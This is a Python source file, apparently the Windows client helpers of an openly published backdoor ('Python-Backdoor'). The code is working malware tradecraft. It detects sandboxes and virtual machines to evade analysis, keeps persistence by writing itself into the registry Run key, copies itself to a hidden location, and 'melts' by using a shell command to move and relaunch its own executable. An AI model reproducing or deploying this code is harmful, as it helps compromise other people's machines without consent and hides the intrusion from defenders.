"""
https://github.com/xp4xbox/Python-Backdoor

@author    xp4xbox
"""

import ctypes
import shutil
import subprocess
import winreg

import win32api
import win32event
import winerror
import wmi

from src import errors
from src.defs import *


def is_duplicate_instance():
    mutex = win32event.CreateMutex(None, 1, MUTEX)
    if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
        mutex = None
        return True

    return False


def detect_sandboxie():
    try:
        ctypes.windll.LoadLibrary("SbieDll.dll")
    except Exception:
        return False
    return True


def detect_vm():
    _wmi = wmi.WMI()
    for objDiskDrive in _wmi.query("Select * from Win32_DiskDrive"):
        if "vbox" in objDiskDrive.Caption.lower() or "virtual" in objDiskDrive.Caption.lower():
            return True
    return False


def remove_from_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
        winreg.DeleteValue(key, REG_STARTUP_NAME)
        winreg.CloseKey(key)
    except FileNotFoundError:
        raise errors.ClientSocket.Persistence.StartupError("Program is not registered in startup.")
    except WindowsError as e:
        raise errors.ClientSocket.Persistence.StartupError(f"Error removing value {e}")


def add_startup():
    try:
        app_path = os.path.join(COPY_LOCATION, os.path.basename(FILE_PATH))
        if not os.getcwd() == COPY_LOCATION:
            shutil.copyfile(FILE_PATH, app_path)

        regkey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_ALL_ACCESS)
        winreg.SetValueEx(regkey, REG_STARTUP_NAME, 0, winreg.REG_SZ, app_path)
        winreg.CloseKey(regkey)
    except WindowsError as e:
        raise errors.ClientSocket.Persistence.StartupError(f"Unable to add to startup {e}")


def melt():
    path = os.path.join(TMP, MELT_FOLDER_NAME)
    # ignore if the path is in copy folder as well
    if not (os.getcwd() == path) and not (os.getcwd() == COPY_LOCATION):
        if not os.path.exists(path):
            try:
                os.mkdir(path)
            except OSError:  # if there is a problem creating the folder, don't melt
                return

        new_file = os.path.join(path, os.path.basename(sys.argv[0]))

        command = f"timeout 2 & move /y {os.path.realpath(sys.argv[0])} {new_file} & cd /d {path}\\ & {new_file}"
        subprocess.Popen(command, shell=True)
        sys.exit(0)

